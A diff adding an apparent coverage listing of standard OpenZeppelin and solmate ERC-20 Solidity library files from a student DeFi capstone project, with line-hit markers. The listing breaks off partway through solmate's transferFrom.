@@ -1,0 +1,1719 @@
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (interfaces/draft-IERC6093.sol)
+   3 |     | pragma solidity >=0.8.4;
+   4 |     | 
+   5 |     | /**
+   6 |     |  * @dev Standard ERC-20 Errors
+   7 |     |  * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.
+   8 |     |  */
+   9 |     | interface IERC20Errors {
+  10 |     |     /**
+  11 |     |      * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
+  12 |     |      * @param sender Address whose tokens are being transferred.
+  13 |     |      * @param balance Current balance for the interacting account.
+  14 |     |      * @param needed Minimum amount required to perform a transfer.
+  15 |     |      */
+  16 |     |     error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
+  17 |     | 
+  18 |     |     /**
+  19 |     |      * @dev Indicates a failure with the token `sender`. Used in transfers.
+  20 |     |      * @param sender Address whose tokens are being transferred.
+  21 |     |      */
+  22 |     |     error ERC20InvalidSender(address sender);
+  23 |     | 
+  24 |     |     /**
+  25 |     |      * @dev Indicates a failure with the token `receiver`. Used in transfers.
+  26 |     |      * @param receiver Address to which tokens are being transferred.
+  27 |     |      */
+  28 |     |     error ERC20InvalidReceiver(address receiver);
+  29 |     | 
+  30 |     |     /**
+  31 |     |      * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
+  32 |     |      * @param spender Address that may be allowed to operate on tokens without being their owner.
+  33 |     |      * @param allowance Amount of tokens a `spender` is allowed to operate with.
+  34 |     |      * @param needed Minimum amount required to perform a transfer.
+  35 |     |      */
+  36 |     |     error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
+  37 |     | 
+  38 |     |     /**
+  39 |     |      * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
+  40 |     |      * @param approver Address initiating an approval operation.
+  41 |     |      */
+  42 |     |     error ERC20InvalidApprover(address approver);
+  43 |     | 
+  44 |     |     /**
+  45 |     |      * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
+  46 |     |      * @param spender Address that may be allowed to operate on tokens without being their owner.
+  47 |     |      */
+  48 |     |     error ERC20InvalidSpender(address spender);
+  49 |     | }
+  50 |     | 
+  51 |     | /**
+  52 |     |  * @dev Standard ERC-721 Errors
+  53 |     |  * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.
+  54 |     |  */
+  55 |     | interface IERC721Errors {
+  56 |     |     /**
+  57 |     |      * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.
+  58 |     |      * Used in balance queries.
+  59 |     |      * @param owner Address of the current owner of a token.
+  60 |     |      */
+  61 |     |     error ERC721InvalidOwner(address owner);
+  62 |     | 
+  63 |     |     /**
+  64 |     |      * @dev Indicates a `tokenId` whose `owner` is the zero address.
+  65 |     |      * @param tokenId Identifier number of a token.
+  66 |     |      */
+  67 |     |     error ERC721NonexistentToken(uint256 tokenId);
+  68 |     | 
+  69 |     |     /**
+  70 |     |      * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
+  71 |     |      * @param sender Address whose tokens are being transferred.
+  72 |     |      * @param tokenId Identifier number of a token.
+  73 |     |      * @param owner Address of the current owner of a token.
+  74 |     |      */
+  75 |     |     error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);
+  76 |     | 
+  77 |     |     /**
+  78 |     |      * @dev Indicates a failure with the token `sender`. Used in transfers.
+  79 |     |      * @param sender Address whose tokens are being transferred.
+  80 |     |      */
+  81 |     |     error ERC721InvalidSender(address sender);
+  82 |     | 
+  83 |     |     /**
+  84 |     |      * @dev Indicates a failure with the token `receiver`. Used in transfers.
+  85 |     |      * @param receiver Address to which tokens are being transferred.
+  86 |     |      */
+  87 |     |     error ERC721InvalidReceiver(address receiver);
+  88 |     | 
+  89 |     |     /**
+  90 |     |      * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
+  91 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
+  92 |     |      * @param tokenId Identifier number of a token.
+  93 |     |      */
+  94 |     |     error ERC721InsufficientApproval(address operator, uint256 tokenId);
+  95 |     | 
+  96 |     |     /**
+  97 |     |      * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
+  98 |     |      * @param approver Address initiating an approval operation.
+  99 |     |      */
+ 100 |     |     error ERC721InvalidApprover(address approver);
+ 101 |     | 
+ 102 |     |     /**
+ 103 |     |      * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
+ 104 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
+ 105 |     |      */
+ 106 |     |     error ERC721InvalidOperator(address operator);
+ 107 |     | }
+ 108 |     | 
+ 109 |     | /**
+ 110 |     |  * @dev Standard ERC-1155 Errors
+ 111 |     |  * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.
+ 112 |     |  */
+ 113 |     | interface IERC1155Errors {
+ 114 |     |     /**
+ 115 |     |      * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
+ 116 |     |      * @param sender Address whose tokens are being transferred.
+ 117 |     |      * @param balance Current balance for the interacting account.
+ 118 |     |      * @param needed Minimum amount required to perform a transfer.
+ 119 |     |      * @param tokenId Identifier number of a token.
+ 120 |     |      */
+ 121 |     |     error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);
+ 122 |     | 
+ 123 |     |     /**
+ 124 |     |      * @dev Indicates a failure with the token `sender`. Used in transfers.
+ 125 |     |      * @param sender Address whose tokens are being transferred.
+ 126 |     |      */
+ 127 |     |     error ERC1155InvalidSender(address sender);
+ 128 |     | 
+ 129 |     |     /**
+ 130 |     |      * @dev Indicates a failure with the token `receiver`. Used in transfers.
+ 131 |     |      * @param receiver Address to which tokens are being transferred.
+ 132 |     |      */
+ 133 |     |     error ERC1155InvalidReceiver(address receiver);
+ 134 |     | 
+ 135 |     |     /**
+ 136 |     |      * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
+ 137 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
+ 138 |     |      * @param owner Address of the current owner of a token.
+ 139 |     |      */
+ 140 |     |     error ERC1155MissingApprovalForAll(address operator, address owner);
+ 141 |     | 
+ 142 |     |     /**
+ 143 |     |      * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
+ 144 |     |      * @param approver Address initiating an approval operation.
+ 145 |     |      */
+ 146 |     |     error ERC1155InvalidApprover(address approver);
+ 147 |     | 
+ 148 |     |     /**
+ 149 |     |      * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
+ 150 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
+ 151 |     |      */
+ 152 |     |     error ERC1155InvalidOperator(address operator);
+ 153 |     | 
+ 154 |     |     /**
+ 155 |     |      * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
+ 156 |     |      * Used in batch transfers.
+ 157 |     |      * @param idsLength Length of the array of token identifiers
+ 158 |     |      * @param valuesLength Length of the array of token amounts
+ 159 |     |      */
+ 160 |     |     error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
+ 161 |     | }
+ 162 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/ERC20.sol)
+   3 |     | 
+   4 |     | pragma solidity ^0.8.20;
+   5 |     | 
+   6 |     | import {IERC20} from "./IERC20.sol";
+   7 |     | import {IERC20Metadata} from "./extensions/IERC20Metadata.sol";
+   8 |     | import {Context} from "../../utils/Context.sol";
+   9 |     | import {IERC20Errors} from "../../interfaces/draft-IERC6093.sol";
+  10 |     | 
+  11 |     | /**
+  12 |     |  * @dev Implementation of the {IERC20} interface.
+  13 |     |  *
+  14 |     |  * This implementation is agnostic to the way tokens are created. This means
+  15 |     |  * that a supply mechanism has to be added in a derived contract using {_mint}.
+  16 |     |  *
+  17 |     |  * TIP: For a detailed writeup see our guide
+  18 |     |  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
+  19 |     |  * to implement supply mechanisms].
+  20 |     |  *
+  21 |     |  * The default value of {decimals} is 18. To change this, you should override
+  22 |     |  * this function so it returns a different value.
+  23 |     |  *
+  24 |     |  * We have followed general OpenZeppelin Contracts guidelines: functions revert
+  25 |     |  * instead returning `false` on failure. This behavior is nonetheless
+  26 |     |  * conventional and does not conflict with the expectations of ERC-20
+  27 |     |  * applications.
+  28 |     |  */
+  29 |     | abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
+  30 |     |     mapping(address account => uint256) private _balances;
+  31 |     | 
+  32 |     |     mapping(address account => mapping(address spender => uint256)) private _allowances;
+  33 |     | 
+  34 |     |     uint256 private _totalSupply;
+  35 |     | 
+  36 |     |     string private _name;
+  37 |     |     string private _symbol;
+  38 |     | 
+  39 |     |     /**
+  40 |     |      * @dev Sets the values for {name} and {symbol}.
+  41 |     |      *
+  42 |     |      * Both values are immutable: they can only be set once during construction.
+  43 |     |      */
+  44 |     |     constructor(string memory name_, string memory symbol_) {
+  45 |     |         _name = name_;
+  46 |     |         _symbol = symbol_;
+  47 |     |     }
+  48 |     | 
+  49 |     |     /**
+  50 |     |      * @dev Returns the name of the token.
+  51 |     |      */
+  52 |     |     function name() public view virtual returns (string memory) {
+  53 |     |         return _name;
+  54 |     |     }
+  55 |     | 
+  56 |     |     /**
+  57 |     |      * @dev Returns the symbol of the token, usually a shorter version of the
+  58 |     |      * name.
+  59 |     |      */
+  60 |     |     function symbol() public view virtual returns (string memory) {
+  61 |     |         return _symbol;
+  62 |     |     }
+  63 |     | 
+  64 |     |     /**
+  65 |     |      * @dev Returns the number of decimals used to get its user representation.
+  66 |     |      * For example, if `decimals` equals `2`, a balance of `505` tokens should
+  67 |     |      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
+  68 |     |      *
+  69 |     |      * Tokens usually opt for a value of 18, imitating the relationship between
+  70 |     |      * Ether and Wei. This is the default value returned by this function, unless
+  71 |     |      * it's overridden.
+  72 |     |      *
+  73 |     |      * NOTE: This information is only used for _display_ purposes: it in
+  74 |     |      * no way affects any of the arithmetic of the contract, including
+  75 |     |      * {IERC20-balanceOf} and {IERC20-transfer}.
+  76 |     |      */
+  77 |     |     function decimals() public view virtual returns (uint8) {
+  78 |     |         return 18;
+  79 |     |     }
+  80 |     | 
+  81 |     |     /// @inheritdoc IERC20
+  82 |     |     function totalSupply() public view virtual returns (uint256) {
+  83 |     |         return _totalSupply;
+  84 |     |     }
+  85 |     | 
+  86 |     |     /// @inheritdoc IERC20
+  87 |     |     function balanceOf(address account) public view virtual returns (uint256) {
+  88 |     |         return _balances[account];
+  89 |     |     }
+  90 |     | 
+  91 |     |     /**
+  92 |     |      * @dev See {IERC20-transfer}.
+  93 |     |      *
+  94 |     |      * Requirements:
+  95 |     |      *
+  96 |     |      * - `to` cannot be the zero address.
+  97 |     |      * - the caller must have a balance of at least `value`.
+  98 |     |      */
+  99 |     |     function transfer(address to, uint256 value) public virtual returns (bool) {
+ 100 |     |         address owner = _msgSender();
+ 101 |     |         _transfer(owner, to, value);
+ 102 |     |         return true;
+ 103 |     |     }
+ 104 |     | 
+ 105 |     |     /// @inheritdoc IERC20
+ 106 |     |     function allowance(address owner, address spender) public view virtual returns (uint256) {
+ 107 |     |         return _allowances[owner][spender];
+ 108 |     |     }
+ 109 |     | 
+ 110 |     |     /**
+ 111 |     |      * @dev See {IERC20-approve}.
+ 112 |     |      *
+ 113 |     |      * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
+ 114 |     |      * `transferFrom`. This is semantically equivalent to an infinite approval.
+ 115 |     |      *
+ 116 |     |      * Requirements:
+ 117 |     |      *
+ 118 |     |      * - `spender` cannot be the zero address.
+ 119 |     |      */
+ 120 |     |     function approve(address spender, uint256 value) public virtual returns (bool) {
+ 121 |     |         address owner = _msgSender();
+ 122 |     |         _approve(owner, spender, value);
+ 123 |     |         return true;
+ 124 |     |     }
+ 125 |     | 
+ 126 |     |     /**
+ 127 |     |      * @dev See {IERC20-transferFrom}.
+ 128 |     |      *
+ 129 |     |      * Skips emitting an {Approval} event indicating an allowance update. This is not
+ 130 |     |      * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
+ 131 |     |      *
+ 132 |     |      * NOTE: Does not update the allowance if the current allowance
+ 133 |     |      * is the maximum `uint256`.
+ 134 |     |      *
+ 135 |     |      * Requirements:
+ 136 |     |      *
+ 137 |     |      * - `from` and `to` cannot be the zero address.
+ 138 |     |      * - `from` must have a balance of at least `value`.
+ 139 |     |      * - the caller must have allowance for ``from``'s tokens of at least
+ 140 |     |      * `value`.
+ 141 |     |      */
+ 142 |     |     function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
+ 143 |     |         address spender = _msgSender();
+ 144 |     |         _spendAllowance(from, spender, value);
+ 145 |     |         _transfer(from, to, value);
+ 146 |     |         return true;
+ 147 |     |     }
+ 148 |     | 
+ 149 |     |     /**
+ 150 |     |      * @dev Moves a `value` amount of tokens from `from` to `to`.
+ 151 |     |      *
+ 152 |     |      * This internal function is equivalent to {transfer}, and can be used to
+ 153 |     |      * e.g. implement automatic token fees, slashing mechanisms, etc.
+ 154 |     |      *
+ 155 |     |      * Emits a {Transfer} event.
+ 156 |     |      *
+ 157 |     |      * NOTE: This function is not virtual, {_update} should be overridden instead.
+ 158 |     |      */
+ 159 |     |     function _transfer(address from, address to, uint256 value) internal {
+ 160 |     |         if (from == address(0)) {
+ 161 |     |             revert ERC20InvalidSender(address(0));
+ 162 |     |         }
+ 163 |     |         if (to == address(0)) {
+ 164 |     |             revert ERC20InvalidReceiver(address(0));
+ 165 |     |         }
+ 166 |     |         _update(from, to, value);
+ 167 |     |     }
+ 168 |     | 
+ 169 |     |     /**
+ 170 |     |      * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
+ 171 |     |      * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
+ 172 |     |      * this function.
+ 173 |     |      *
+ 174 |     |      * Emits a {Transfer} event.
+ 175 |     |      */
+ 176 |     |     function _update(address from, address to, uint256 value) internal virtual {
+ 177 |     |         if (from == address(0)) {
+ 178 |     |             // Overflow check required: The rest of the code assumes that totalSupply never overflows
+ 179 |     |             _totalSupply += value;
+ 180 |     |         } else {
+ 181 |     |             uint256 fromBalance = _balances[from];
+ 182 |     |             if (fromBalance < value) {
+ 183 |     |                 revert ERC20InsufficientBalance(from, fromBalance, value);
+ 184 |     |             }
+ 185 |     |             unchecked {
+ 186 |     |                 // Overflow not possible: value <= fromBalance <= totalSupply.
+ 187 |     |                 _balances[from] = fromBalance - value;
+ 188 |     |             }
+ 189 |     |         }
+ 190 |     | 
+ 191 |     |         if (to == address(0)) {
+ 192 |     |             unchecked {
+ 193 |     |                 // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
+ 194 |     |                 _totalSupply -= value;
+ 195 |     |             }
+ 196 |     |         } else {
+ 197 |     |             unchecked {
+ 198 |     |                 // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
+ 199 |     |                 _balances[to] += value;
+ 200 |     |             }
+ 201 |     |         }
+ 202 |     | 
+ 203 |     |         emit Transfer(from, to, value);
+ 204 |     |     }
+ 205 |     | 
+ 206 |     |     /**
+ 207 |     |      * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
+ 208 |     |      * Relies on the `_update` mechanism
+ 209 |     |      *
+ 210 |     |      * Emits a {Transfer} event with `from` set to the zero address.
+ 211 |     |      *
+ 212 |     |      * NOTE: This function is not virtual, {_update} should be overridden instead.
+ 213 |     |      */
+ 214 |     |     function _mint(address account, uint256 value) internal {
+ 215 |     |         if (account == address(0)) {
+ 216 |     |             revert ERC20InvalidReceiver(address(0));
+ 217 |     |         }
+ 218 |     |         _update(address(0), account, value);
+ 219 |     |     }
+ 220 |     | 
+ 221 |     |     /**
+ 222 |     |      * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
+ 223 |     |      * Relies on the `_update` mechanism.
+ 224 |     |      *
+ 225 |     |      * Emits a {Transfer} event with `to` set to the zero address.
+ 226 |     |      *
+ 227 |     |      * NOTE: This function is not virtual, {_update} should be overridden instead
+ 228 |     |      */
+ 229 |     |     function _burn(address account, uint256 value) internal {
+ 230 |     |         if (account == address(0)) {
+ 231 |     |             revert ERC20InvalidSender(address(0));
+ 232 |     |         }
+ 233 |     |         _update(account, address(0), value);
+ 234 |     |     }
+ 235 |     | 
+ 236 |     |     /**
+ 237 |     |      * @dev Sets `value` as the allowance of `spender` over the `owner`'s tokens.
+ 238 |     |      *
+ 239 |     |      * This internal function is equivalent to `approve`, and can be used to
+ 240 |     |      * e.g. set automatic allowances for certain subsystems, etc.
+ 241 |     |      *
+ 242 |     |      * Emits an {Approval} event.
+ 243 |     |      *
+ 244 |     |      * Requirements:
+ 245 |     |      *
+ 246 |     |      * - `owner` cannot be the zero address.
+ 247 |     |      * - `spender` cannot be the zero address.
+ 248 |     |      *
+ 249 |     |      * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
+ 250 |     |      */
+ 251 |     |     function _approve(address owner, address spender, uint256 value) internal {
+ 252 |     |         _approve(owner, spender, value, true);
+ 253 |     |     }
+ 254 |     | 
+ 255 |     |     /**
+ 256 |     |      * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
+ 257 |     |      *
+ 258 |     |      * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
+ 259 |     |      * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
+ 260 |     |      * `Approval` event during `transferFrom` operations.
+ 261 |     |      *
+ 262 |     |      * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
+ 263 |     |      * true using the following override:
+ 264 |     |      *
+ 265 |     |      * ```solidity
+ 266 |     |      * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
+ 267 |     |      *     super._approve(owner, spender, value, true);
+ 268 |     |      * }
+ 269 |     |      * ```
+ 270 |     |      *
+ 271 |     |      * Requirements are the same as {_approve}.
+ 272 |     |      */
+ 273 |     |     function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
+ 274 |     |         if (owner == address(0)) {
+ 275 |     |             revert ERC20InvalidApprover(address(0));
+ 276 |     |         }
+ 277 |     |         if (spender == address(0)) {
+ 278 |     |             revert ERC20InvalidSpender(address(0));
+ 279 |     |         }
+ 280 |     |         _allowances[owner][spender] = value;
+ 281 |     |         if (emitEvent) {
+ 282 |     |             emit Approval(owner, spender, value);
+ 283 |     |         }
+ 284 |     |     }
+ 285 |     | 
+ 286 |     |     /**
+ 287 |     |      * @dev Updates `owner`'s allowance for `spender` based on spent `value`.
+ 288 |     |      *
+ 289 |     |      * Does not update the allowance value in case of infinite allowance.
+ 290 |     |      * Revert if not enough allowance is available.
+ 291 |     |      *
+ 292 |     |      * Does not emit an {Approval} event.
+ 293 |     |      */
+ 294 |     |     function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
+ 295 |     |         uint256 currentAllowance = allowance(owner, spender);
+ 296 |     |         if (currentAllowance < type(uint256).max) {
+ 297 |     |             if (currentAllowance < value) {
+ 298 |     |                 revert ERC20InsufficientAllowance(spender, currentAllowance, value);
+ 299 |     |             }
+ 300 |     |             unchecked {
+ 301 |     |                 _approve(owner, spender, currentAllowance - value, false);
+ 302 |     |             }
+ 303 |     |         }
+ 304 |     |     }
+ 305 |     | }
+ 306 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/IERC20.sol)
+  3 |     | 
+  4 |     | pragma solidity >=0.4.16;
+  5 |     | 
+  6 |     | /**
+  7 |     |  * @dev Interface of the ERC-20 standard as defined in the ERC.
+  8 |     |  */
+  9 |     | interface IERC20 {
+ 10 |     |     /**
+ 11 |     |      * @dev Emitted when `value` tokens are moved from one account (`from`) to
+ 12 |     |      * another (`to`).
+ 13 |     |      *
+ 14 |     |      * Note that `value` may be zero.
+ 15 |     |      */
+ 16 |     |     event Transfer(address indexed from, address indexed to, uint256 value);
+ 17 |     | 
+ 18 |     |     /**
+ 19 |     |      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
+ 20 |     |      * a call to {approve}. `value` is the new allowance.
+ 21 |     |      */
+ 22 |     |     event Approval(address indexed owner, address indexed spender, uint256 value);
+ 23 |     | 
+ 24 |     |     /**
+ 25 |     |      * @dev Returns the value of tokens in existence.
+ 26 |     |      */
+ 27 |     |     function totalSupply() external view returns (uint256);
+ 28 |     | 
+ 29 |     |     /**
+ 30 |     |      * @dev Returns the value of tokens owned by `account`.
+ 31 |     |      */
+ 32 |     |     function balanceOf(address account) external view returns (uint256);
+ 33 |     | 
+ 34 |     |     /**
+ 35 |     |      * @dev Moves a `value` amount of tokens from the caller's account to `to`.
+ 36 |     |      *
+ 37 |     |      * Returns a boolean value indicating whether the operation succeeded.
+ 38 |     |      *
+ 39 |     |      * Emits a {Transfer} event.
+ 40 |     |      */
+ 41 |     |     function transfer(address to, uint256 value) external returns (bool);
+ 42 |     | 
+ 43 |     |     /**
+ 44 |     |      * @dev Returns the remaining number of tokens that `spender` will be
+ 45 |     |      * allowed to spend on behalf of `owner` through {transferFrom}. This is
+ 46 |     |      * zero by default.
+ 47 |     |      *
+ 48 |     |      * This value changes when {approve} or {transferFrom} are called.
+ 49 |     |      */
+ 50 |     |     function allowance(address owner, address spender) external view returns (uint256);
+ 51 |     | 
+ 52 |     |     /**
+ 53 |     |      * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
+ 54 |     |      * caller's tokens.
+ 55 |     |      *
+ 56 |     |      * Returns a boolean value indicating whether the operation succeeded.
+ 57 |     |      *
+ 58 |     |      * IMPORTANT: Beware that changing an allowance with this method brings the risk
+ 59 |     |      * that someone may use both the old and the new allowance by unfortunate
+ 60 |     |      * transaction ordering. One possible solution to mitigate this race
+ 61 |     |      * condition is to first reduce the spender's allowance to 0 and set the
+ 62 |     |      * desired value afterwards:
+ 63 |     |      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
+ 64 |     |      *
+ 65 |     |      * Emits an {Approval} event.
+ 66 |     |      */
+ 67 |     |     function approve(address spender, uint256 value) external returns (bool);
+ 68 |     | 
+ 69 |     |     /**
+ 70 |     |      * @dev Moves a `value` amount of tokens from `from` to `to` using the
+ 71 |     |      * allowance mechanism. `value` is then deducted from the caller's
+ 72 |     |      * allowance.
+ 73 |     |      *
+ 74 |     |      * Returns a boolean value indicating whether the operation succeeded.
+ 75 |     |      *
+ 76 |     |      * Emits a {Transfer} event.
+ 77 |     |      */
+ 78 |     |     function transferFrom(address from, address to, uint256 value) external returns (bool);
+ 79 |     | }
+ 80 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/extensions/IERC20Metadata.sol)
+  3 |     | 
+  4 |     | pragma solidity >=0.6.2;
+  5 |     | 
+  6 |     | import {IERC20} from "../IERC20.sol";
+  7 |     | 
+  8 |     | /**
+  9 |     |  * @dev Interface for the optional metadata functions from the ERC-20 standard.
+ 10 |     |  */
+ 11 |     | interface IERC20Metadata is IERC20 {
+ 12 |     |     /**
+ 13 |     |      * @dev Returns the name of the token.
+ 14 |     |      */
+ 15 |     |     function name() external view returns (string memory);
+ 16 |     | 
+ 17 |     |     /**
+ 18 |     |      * @dev Returns the symbol of the token.
+ 19 |     |      */
+ 20 |     |     function symbol() external view returns (string memory);
+ 21 |     | 
+ 22 |     |     /**
+ 23 |     |      * @dev Returns the decimals places of the token.
+ 24 |     |      */
+ 25 |     |     function decimals() external view returns (uint8);
+ 26 |     | }
+ 27 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/utils/Context.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | // OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)
+  3 |     | 
+  4 |     | pragma solidity ^0.8.20;
+  5 |     | 
+  6 |     | /**
+  7 |     |  * @dev Provides information about the current execution context, including the
+  8 |     |  * sender of the transaction and its data. While these are generally available
+  9 |     |  * via msg.sender and msg.data, they should not be accessed in such a direct
+ 10 |     |  * manner, since when dealing with meta-transactions the account sending and
+ 11 |     |  * paying for execution may not be the actual sender (as far as an application
+ 12 |     |  * is concerned).
+ 13 |     |  *
+ 14 |     |  * This contract is only required for intermediate, library-like contracts.
+ 15 |     |  */
+ 16 |     | abstract contract Context {
+ 17 |     |     function _msgSender() internal view virtual returns (address) {
+ 18 |     |         return msg.sender;
+ 19 |     |     }
+ 20 |     | 
+ 21 |     |     function _msgData() internal view virtual returns (bytes calldata) {
+ 22 |     |         return msg.data;
+ 23 |     |     }
+ 24 |     | 
+ 25 |     |     function _contextSuffixLength() internal view virtual returns (uint256) {
+ 26 |     |         return 0;
+ 27 |     |     }
+ 28 |     | }
+ 29 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/tokens/ERC20.sol
+   1 |     | // SPDX-License-Identifier: AGPL-3.0-only
+   2 |     | pragma solidity >=0.8.0;
+   3 |     | 
+   4 |     | /// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.
+   5 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)
+   6 |     | /// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)
+   7 |     | /// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.
+   8 |     | abstract contract ERC20 {
+   9 |     |     /*//////////////////////////////////////////////////////////////
+  10 |     |                                  EVENTS
+  11 |     |     //////////////////////////////////////////////////////////////*/
+  12 |     | 
+  13 |     |     event Transfer(address indexed from, address indexed to, uint256 amount);
+  14 |     | 
+  15 |     |     event Approval(address indexed owner, address indexed spender, uint256 amount);
+  16 |     | 
+  17 |     |     /*//////////////////////////////////////////////////////////////
+  18 |     |                             METADATA STORAGE
+  19 |     |     //////////////////////////////////////////////////////////////*/
+  20 |     | 
+  21 |     |     string public name;
+  22 |     | 
+  23 |     |     string public symbol;
+  24 |     | 
+  25 |     |     uint8 public immutable decimals;
+  26 |     | 
+  27 |     |     /*//////////////////////////////////////////////////////////////
+  28 |     |                               ERC20 STORAGE
+  29 |     |     //////////////////////////////////////////////////////////////*/
+  30 |     | 
+  31 |     |     uint256 public totalSupply;
+  32 |     | 
+  33 |     |     mapping(address => uint256) public balanceOf;
+  34 |     | 
+  35 |     |     mapping(address => mapping(address => uint256)) public allowance;
+  36 |     | 
+  37 |     |     /*//////////////////////////////////////////////////////////////
+  38 |     |                             EIP-2612 STORAGE
+  39 |     |     //////////////////////////////////////////////////////////////*/
+  40 |     | 
+  41 |     |     uint256 internal immutable INITIAL_CHAIN_ID;
+  42 |     | 
+  43 |     |     bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;
+  44 |     | 
+  45 |     |     mapping(address => uint256) public nonces;
+  46 |     | 
+  47 |     |     /*//////////////////////////////////////////////////////////////
+  48 |     |                                CONSTRUCTOR
+  49 |     |     //////////////////////////////////////////////////////////////*/
+  50 |     | 
+  51 | *   |     constructor(
+  52 |     |         string memory _name,
+  53 |     |         string memory _symbol,
+  54 |     |         uint8 _decimals
+  55 |     |     ) {
+  56 | *   |         name = _name;
+  57 | *   |         symbol = _symbol;
+  58 | *   |         decimals = _decimals;
+  59 |     | 
+  60 | *   |         INITIAL_CHAIN_ID = block.chainid;
+  61 | *   |         INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();
+  62 |     |     }
+  63 |     | 
+  64 |     |     /*//////////////////////////////////////////////////////////////
+  65 |     |                                ERC20 LOGIC
+  66 |     |     //////////////////////////////////////////////////////////////*/
+  67 |     | 
+  68 |     |     function approve(address spender, uint256 amount) public virtual returns (bool) {
+  69 |     |         allowance[msg.sender][spender] = amount;
+  70 |     | 
+  71 |     |         emit Approval(msg.sender, spender, amount);
+  72 |     | 
+  73 |     |         return true;
+  74 |     |     }
+  75 |     | 
+  76 |     |     function transfer(address to, uint256 amount) public virtual returns (bool) {
+  77 |     |         balanceOf[msg.sender] -= amount;
+  78 |     | 
+  79 |     |         // Cannot overflow because the sum of all user
+  80 |     |         // balances can't exceed the max uint256 value.
+  81 |     |         unchecked {
+  82 |     |             balanceOf[to] += amount;
+  83 |     |         }
+  84 |     | 
+  85 |     |         emit Transfer(msg.sender, to, amount);
+  86 |     | 
+  87 |     |         return true;
+  88 |     |     }
+  89 |     | 
+  90 |     |     function transferFrom(
+  91 |     |         address from,
+  92 |     |         address to,
+  93 |     |         uint256 amount
+  94 |     |     ) public virtual returns (bool) {
+  95 |     |         uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.
+  96 |     | 
+  97 |     |         if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
+  98 |     | 
